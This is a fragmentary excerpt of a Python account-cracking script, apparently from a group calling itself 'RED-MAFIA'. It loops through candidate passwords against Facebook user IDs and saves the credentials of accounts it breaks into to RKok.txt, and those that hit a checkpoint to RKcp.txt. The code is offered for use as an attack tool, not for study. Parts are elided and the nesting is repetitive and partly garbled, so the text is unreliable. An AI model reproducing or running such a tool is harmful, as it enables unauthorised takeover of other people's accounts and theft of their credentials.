...
logo = """
     \033[1;92mooooooooo.         .o.
     \033[1;93m`888   `Y88.      .888.
     \033[1;92m888   .d88'     .8"888.
     \033[1;93m888ooo88P'     .8' `888.
     \033[1;92m888`88b.      .88ooo8888.
     \033[1;93m888  `88b.   .8'     `888.
     \033[1;92mo888o  o888o o88o     o8888o
\033[1;93m-----------------------------------------------------
 \033[1;93m(*)\033[1;92m Developer: (RIAZKHAN TEAM RED-MAFIA)
 \033[1;93m(*)\033[1;92m WhatsApp :   03188214452
 \033[1;93m(*)\033[1;92m Github   : https://github.com/Red-Mafia
\033[1;93m-----------------------------------------------------
"""
def tool():
	os.system("clear")
...
def crack_select():
	...
	if select =="1":
		...
		try:
			...
			print(logo)
			print('')
			print("  RED-MAFIA RK START CRACKING.....")
			print('')
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m [RK-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("RKok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				...
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [RK-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("RKcp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m [RK-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("RKok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;33m [RK-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("RKcp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;32m [RK-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("RKok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [RK-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("RKcp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;32m [RK-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("RKok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;33m [RK-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("RKcp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;32m [RK-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("RKok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;33m [RK-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("RKcp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													...
													q = json.loads(data)
													if "access_token" in q:
														print(" \033[1;32m [RK-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("RKok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;33m [RK-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("RKcp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															q = json.loads(data)
															if "access_token" in q:
																print(" \033[1;32m [RK-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("RKok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;33m [RK-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("RKcp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
											...
											if "access_token" in q:
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													if "access_token" in q:
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;28m [RK-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("RKcp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
